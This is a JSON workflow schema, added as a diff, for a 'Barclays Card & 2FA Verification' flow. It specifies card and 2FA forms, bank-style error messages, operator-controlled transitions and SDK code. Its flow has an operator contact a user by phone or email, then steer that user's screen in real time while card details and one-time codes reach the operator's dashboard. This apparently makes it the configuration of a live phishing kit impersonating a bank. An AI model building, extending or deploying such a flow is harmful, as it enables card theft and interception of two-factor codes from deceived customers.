@@ -1,0 +1,174 @@
+{
+  "_readme": "Control Room Workflow Schema — Send this file to your vendor's frontend team.",
+  "_error_handling": "Each state may have predefined_errors. Your UI should listen for 'operator_error' events and display the message. The operator can also send custom error strings not in this list.",
+  "workflow_id": "51555f61-7248-4d66-8c7a-30cb463419a1",
+  "tenant_id": "e63d3b80-3289-499e-84ca-292b70c13ac6",
+  "name": "Barclays Card & 2FA Verification",
+  "description": "Customer enters card details for verification, then completes a 2FA challenge. Operator controls approval/rejection at each step.",
+  "components_to_build": [
+    {
+      "component_key": "CardForm",
+      "state_key": "card",
+      "label": "Card Details",
+      "is_initial": true,
+      "is_final": false,
+      "predefined_errors": [
+        "The card number you entered is invalid. Please check and try again.",
+        "This card has expired. Please use a different card.",
+        "We could not verify the card details provided. Please try again.",
+        "This card is not associated with your account."
+      ]
+    },
+    {
+      "component_key": "TwoFactorForm",
+      "state_key": "2fa",
+      "label": "2FA Verification",
+      "is_initial": false,
+      "is_final": false,
+      "predefined_errors": [
+        "The verification code you entered is incorrect. Please try again.",
+        "Your verification code has expired. Please request a new one.",
+        "Too many incorrect attempts. Please wait and try again.",
+        "We were unable to send a verification code. Please try a different method."
+      ]
+    },
+    {
+      "component_key": "ProcessingScreen",
+      "state_key": "processing",
+      "label": "Processing",
+      "is_initial": false,
+      "is_final": false,
+      "predefined_errors": []
+    },
+    {
+      "component_key": "SuccessScreen",
+      "state_key": "success",
+      "label": "Verification Complete",
+      "is_initial": false,
+      "is_final": true,
+      "predefined_errors": []
+    },
+    {
+      "component_key": "FailureScreen",
+      "state_key": "failure",
+      "label": "Verification Failed",
+      "is_initial": false,
+      "is_final": true,
+      "predefined_errors": []
+    }
+  ],
+  "states": [
+    {
+      "state_key": "card",
+      "label": "Card Details",
+      "component_key": "CardForm",
+      "is_initial": true,
+      "is_final": false,
+      "predefined_errors": [
+        "The card number you entered is invalid. Please check and try again.",
+        "This card has expired. Please use a different card.",
+        "We could not verify the card details provided. Please try again.",
+        "This card is not associated with your account."
+      ]
+    },
+    {
+      "state_key": "2fa",
+      "label": "2FA Verification",
+      "component_key": "TwoFactorForm",
+      "is_initial": false,
+      "is_final": false,
+      "predefined_errors": [
+        "The verification code you entered is incorrect. Please try again.",
+        "Your verification code has expired. Please request a new one.",
+        "Too many incorrect attempts. Please wait and try again.",
+        "We were unable to send a verification code. Please try a different method."
+      ]
+    },
+    {
+      "state_key": "processing",
+      "label": "Processing",
+      "component_key": "ProcessingScreen",
+      "is_initial": false,
+      "is_final": false,
+      "predefined_errors": []
+    },
+    {
+      "state_key": "success",
+      "label": "Verification Complete",
+      "component_key": "SuccessScreen",
+      "is_initial": false,
+      "is_final": true,
+      "predefined_errors": []
+    },
+    {
+      "state_key": "failure",
+      "label": "Verification Failed",
+      "component_key": "FailureScreen",
+      "is_initial": false,
+      "is_final": true,
+      "predefined_errors": []
+    }
+  ],
+  "transitions": [
+    {
+      "from_state_key": "2fa",
+      "to_state_key": "success",
+      "event_type": "code_verified"
+    },
+    {
+      "from_state_key": "2fa",
+      "to_state_key": "processing",
+      "event_type": "hold_for_review"
+    },
+    {
+      "from_state_key": "2fa",
+      "to_state_key": "failure",
+      "event_type": "reject_permanently"
+    },
+    {
+      "from_state_key": "card",
+      "to_state_key": "2fa",
+      "event_type": "card_approved"
+    },
+    {
+      "from_state_key": "card",
+      "to_state_key": "processing",
+      "event_type": "hold_for_review"
+    },
+    {
+      "from_state_key": "card",
+      "to_state_key": "failure",
+      "event_type": "reject_permanently"
+    },
+    {
+      "from_state_key": "processing",
+      "to_state_key": "card",
+      "event_type": "resume_to_card"
+    },
+    {
+      "from_state_key": "processing",
+      "to_state_key": "2fa",
+      "event_type": "resume_to_2fa"
+    },
+    {
+      "from_state_key": "processing",
+      "to_state_key": "success",
+      "event_type": "approve_complete"
+    },
+    {
+      "from_state_key": "processing",
+      "to_state_key": "failure",
+      "event_type": "reject_permanently"
+    }
+  ],
+  "sdk_integration": {
+    "install": "npm install @control-room/sdk @supabase/ssr",
+    "flow": [
+      "1. Operator creates a session in the Control Room dashboard → gets reference e.g. 'CR-250515-AB3F'",
+      "2. Operator gives reference to the end-user (phone call, email, etc.)",
+      "3. User enters reference on your website → your app calls session.connect(ref)",
+      "4. Operator controls the flow from dashboard → user's screen updates in real-time"
+    ],
+    "usage": "import { ControlRoomSession } from '@control-room/sdk';\n\n// Initialize the SDK (once, on app load)\nconst session = new ControlRoomSession({\n  tenant_id: 'e63d3b80-3289-499e-84ca-292b70c13ac6',\n  supabaseUrl: 'YOUR_SUPABASE_URL',\n  supabaseKey: 'YOUR_SUPABASE_PUBLISHABLE_KEY',\n});\n\n// When user enters their reference number:\nconst state = await session.connect(userEnteredReference);\n// state.component_key → which React component to render\n// state.current_state → the state machine key\n\n// Listen for operator actions (real-time)\nsession.subscribe((newState) => {\n  // Operator clicked 'Approve' or 'Next' → screen changes instantly\n  renderComponent(newState.component_key);\n});\n\n// Send user input to the operator's dashboard\nawait session.sendInput({ field_name: 'value' });"
+  }
+}
